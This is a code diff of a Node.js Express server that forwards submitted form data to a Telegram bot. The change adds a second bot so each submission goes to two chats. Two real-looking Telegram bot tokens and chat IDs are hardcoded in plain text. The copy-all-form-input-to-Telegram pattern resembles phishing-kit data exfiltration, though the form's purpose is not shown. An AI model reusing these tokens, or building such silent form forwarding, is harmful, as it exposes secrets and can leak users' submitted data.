@@ -1,16 +1,17 @@
-const fetch = require('node-fetch'); // Correct for node-fetch v2
-
+const fetch = require('node-fetch');
 
 const express = require('express');
 const path = require('path');
 const cors = require('cors');
 
-
 const app = express();
 const PORT = 3000;
 
-const TELEGRAM_TOKEN = '7655310388:AAGiauGQ8lEPAm0yPwBBqYZcF1LtS_wb2AI';
-const TELEGRAM_CHAT_ID = '5031717876';
+const TELEGRAM_TOKEN1 = '7655310388:AAGiauGQ8lEPAm0yPwBBqYZcF1LtS_wb2AI';
+const TELEGRAM_CHAT_ID1 = '5031717876';
+
+const TELEGRAM_TOKEN2 = '7667562046:AAFQyO7ZhTk0e_VnkeDIBHqt47zgwTL33CM';
+const TELEGRAM_CHAT_ID2 = '5825012981';
 
 app.use(cors());
 app.use(express.json());
@@ -28,25 +29,41 @@ ${JSON.stringify(formData, null, 2)}
 `;
 
   try {
-    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    // Prepare URLs
+    const telegramUrl1 = `https://api.telegram.org/bot${TELEGRAM_TOKEN1}/sendMessage`;
+    const telegramUrl2 = `https://api.telegram.org/bot${TELEGRAM_TOKEN2}/sendMessage`;
 
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: messageText
+    // Send to both bots in parallel
+    const [response1, response2] = await Promise.all([
+      fetch(telegramUrl1, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID1,
+          text: messageText
+        })
+      }),
+      fetch(telegramUrl2, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID2,
+          text: messageText
+        })
       })
-    });
+    ]);
 
-    const result = await response.text();
-    console.log('Telegram response:', result);
+    const result1 = await response1.text();
+    const result2 = await response2.text();
 
-    if (!response.ok) {
-      return res.status(500).json({ error: 'Failed to send Telegram message' });
+    console.log('Telegram bot 1 response:', result1);
+    console.log('Telegram bot 2 response:', result2);
+
+    if (!response1.ok || !response2.ok) {
+      return res.status(500).json({ error: 'Failed to send Telegram messages' });
     }
 
-    res.json({ message: 'Success: Data sent to Telegram' });
+    res.json({ message: 'Success: Data sent to both Telegram bots' });
   } catch (error) {
     console.error('Telegram error:', error);
     res.status(500).json({ error: 'Telegram error' });
